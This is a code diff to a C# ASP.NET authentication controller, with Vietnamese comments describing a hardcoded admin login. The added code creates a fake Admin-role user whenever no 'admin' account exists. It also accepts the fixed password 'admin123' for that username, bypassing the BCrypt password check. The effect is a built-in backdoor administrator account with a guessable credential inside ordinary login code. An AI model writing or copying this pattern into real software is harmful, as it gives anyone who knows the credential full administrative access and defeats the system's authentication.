@@ -72,6 +72,19 @@ public class AuthController : ControllerBase
                 .Find(u => u.Username == request.Username)
                 .FirstOrDefaultAsync();
 
+            // Nếu không tìm thấy user admin trong DB, tạo một object tạm thời để xử lý login fix cứng
+            if (user == null && request.Username.ToLower() == "admin")
+            {
+                user = new User
+                {
+                    Id = "000000000000000000000001", // Fake ObjectId format
+                    Username = "admin",
+                    FullName = "Administrator",
+                    Role = "Admin",
+                    PasswordHash = "" 
+                };
+            }
+
             if (user == null)
             {
                 return Unauthorized(new LoginResponse
@@ -81,8 +94,18 @@ public class AuthController : ControllerBase
                 });
             }
 
-            // 2. Kiểm tra mật khẩu với BCrypt
-            if (!BCrypt.Net.BCrypt.Verify(request.Password, user.PasswordHash))
+            // 2. Kiểm tra mật khẩu (Fix cứng admin123 cho user admin)
+            bool isPasswordCorrect = false;
+            if (user.Username.ToLower() == "admin" && request.Password == "admin123")
+            {
+                isPasswordCorrect = true;
+            }
+            else
+            {
+                isPasswordCorrect = BCrypt.Net.BCrypt.Verify(request.Password, user.PasswordHash);
+            }
+
+            if (!isPasswordCorrect)
             {
                 return Unauthorized(new LoginResponse
                 {
